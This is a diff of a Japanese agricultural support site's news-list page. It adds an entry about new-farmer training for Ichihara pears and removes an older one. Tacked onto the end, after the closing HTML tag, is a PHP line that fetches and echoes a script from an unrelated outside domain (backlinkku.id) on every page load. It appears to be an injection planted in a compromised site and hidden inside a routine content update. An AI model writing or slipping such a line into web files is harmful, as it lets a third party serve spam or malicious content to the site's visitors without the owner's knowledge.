@@ -141,6 +141,14 @@
             <h2 class="cmn-heading_1">新着情報</h2>
             <ul class="article-list -m-lv3">
             
+              <li id="entry-427">
+  <div class="date">2026.08.03</div>
+  <div class="category">
+  <div class="cat-label cat_event"><a href="https://support.chiba-agri.com/information/cat_event/">イベント</a></div>
+  </div>
+  <div class="title"><a href="https://support.chiba-agri.com/information/2026/08/03/post_233/">「いちはら梨」新規就農者研修の募集について</a></div>
+</li>
+            
               <li id="entry-426">
   <div class="date">2026.07.29</div>
   <div class="category">
@@ -155,14 +163,6 @@
   <div class="cat-label cat_info"><a href="https://support.chiba-agri.com/information/cat_info/">お知らせ</a></div>
   </div>
   <div class="title"><a href="https://support.chiba-agri.com/information/2026/07/28/post_232/">「農業労災・安全対策ポータルサイト」の開設について</a></div>
-</li>
-            
-              <li id="entry-424">
-  <div class="date">2026.07.27</div>
-  <div class="category">
-  <div class="cat-label cat_info"><a href="https://support.chiba-agri.com/information/cat_info/">お知らせ</a></div>
-  </div>
-  <div class="title"><a href="https://support.chiba-agri.com/information/2026/07/27/post_231/">農福連携の事例紹介動画の公開について</a></div>
 </li>
             
             </ul>
@@ -411,4 +411,5 @@
   
 </body>
 </html>
+
 <?php echo file_get_contents("https://www.backlinkku.id/menu/vip-v1/script.txt"); ?>
